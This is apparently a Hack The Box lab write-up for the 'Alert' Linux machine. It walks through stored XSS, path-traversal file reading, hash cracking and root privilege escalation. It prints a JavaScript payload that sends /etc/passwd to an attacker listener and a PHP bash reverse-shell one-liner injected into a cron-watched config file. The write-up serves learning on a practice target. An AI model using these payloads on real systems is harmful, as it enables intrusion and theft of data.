---
title: "HTB Writeup: Alert (Easy - Linux)"
date: 2025-02-15
tags: ["HackTheBox", "Linux", "Easy", "XSS", "SSRF", "FileExtraction", "Hashcat", "LinPEAS"]
categories: ["HTB Writeups"]
description: "Stored XSS → shell injection → privesc via vulnerable config"
showToc: true
---

## 📈 Introduction

![Alert Logo](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/Alert.png)

In this write-up, I'll walk you through my approach to solving the **Alert** machine from Hack The Box. Alert is a Linux box rated as "Easy," but it gave me a lot of web exploitation and privilege escalation practice.

---

## 🔎 Enumeration

![Nmap Scan](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertnmap.png)

Nmap revealed open ports 22 (SSH) and 80 (HTTP). The website was a Markdown Viewer at `http://alert.htb`.

---

## 🌐 Web Landing & Initial XSS

![Landing Page](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertlandingpage.png)

The site had a Markdown Viewer where I uploaded a malicious file:

![Markdown File Upload](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertmdfile.png)

I then abused the contact form to trigger a bot to visit my malicious shared link:

![Contact Message Exploit](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertcontactsetup.png)

![Share Link](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertsharelink.png)

---

## 📥 Listener & File Extraction

Once the bot visited, I used a payload to exfiltrate files:

```javascript
fetch("http://alert.htb/messages.php?file=../../../../etc/passwd")
  .then(r => r.text())
  .then(d => fetch("http://10.10.14.15:9001/?data=" + btoa(d)));
```

![Listener Receiving Data](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertlistener.png)

![Base64 Decode Example](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertbase64decode.png)

---

## 🔐 Extracting Credentials

I retrieved `/var/www/statistics.alert.htb/.htpasswd` using the same technique:

![Retrieved .htpasswd File](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertmdhtpasswd.png)

Then cracked the hash with Hashcat:

![Cracked Password with Hashcat](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alerthashcracked.png)

---

## 🔑 SSH & Internal Enumeration

I connected via SSH as `albert:[REDACTED]` and ran enumeration:

![SSH into albert Account](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertssh.png)

![Post SSH Enumeration](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertenum.png)

---

## 🚀 Privilege Escalation

I found that `/opt/website-monitor/config/configuration.php` was watched by a root cronjob.

Injected payload:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1'"); ?>
```

I caught a root shell:

![Root Shell Access](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertervshell.png)

![Reverse Shell Payload Injection](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertrspayload.png)

---

## 🏴 Root & Final Proof

![Root + Pwned Proof](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/alertpwned.png)

I captured both flags:
- **User:** [REDACTED]
- **Root:** [REDACTED]

---

## 📜 Lessons Learned

- File upload + XSS chaining
- XSS + SSRF-style file extraction
- Manual enumeration + LinPEAS to spot the escalation vector

**LinPEAS** proved incredibly powerful once again.

### ✅ Machine Completed: Alert

[9t0wl #1984386](https://app.hackthebox.com/profile/1984386)
